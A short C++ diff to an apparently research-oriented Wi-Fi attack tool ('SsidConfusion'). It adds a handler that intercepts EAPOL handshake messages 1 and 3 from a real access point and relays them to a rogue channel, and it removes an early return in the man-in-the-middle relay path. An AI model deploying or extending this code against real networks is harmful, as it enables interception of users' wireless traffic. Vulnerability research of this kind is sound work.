@@ -19,6 +19,22 @@ void SsidConfusion::send_to_rogue(const vector<uint8_t> &raw) const {
 	sock_rogue->send(translated, netconfig.rogue_channel);
 }
 
+FrameProcess SsidConfusion::handle_eapol_real(const HWAddress<6> addr1,
+											  const HWAddress<6> addr2,
+											  PDU &pdu) const {
+	// EAPOL AP -> STA on real channel
+	if(addr1 == sta.get(SK::mac) && addr2 == ap.get(SK::mac) && is_eapol(pdu)) {
+		int eapol_msg = get_eapol_msg_num(pdu);
+		log(LogLevel::INFO, "Real channel: EAPOL {} AP -> STA", eapol_msg);
+
+		if(eapol_msg == 1 || eapol_msg == 3) {
+			send_to_rogue(pdu);
+			return STOP;
+		}
+	}
+	return CONTINUE;
+}
+
 FrameProcess SsidConfusion::handle_probe_real(const HWAddress<6> addr2, const Dot11 &dot11) const {
 	if(dot11.find_pdu<Dot11ProbeRequest>() || dot11.find_pdu<Dot11ProbeResponse>()){
 		if(addr2 == sta.get(SK::mac)) display_traffic(dot11, "Real channel", " -- Ignore");
@@ -60,12 +76,8 @@ void SsidConfusion::handle_rx_real_chan(const std::unique_ptr<PDU> &pdu, const s
 
 	if(addr1 == sta.get(SK::mac) || addr2 == ap.get(SK::mac)) {
 		// This is traffic involving the real AP
-
-		//translate_data_mac(translated, ap_bssid, rogue_ap_mac);
-
 		display_traffic(*pdu, "Real channel", " -- MitM'ing");
 		send_to_rogue(*pdu);
-		return;
 	}
 }
 
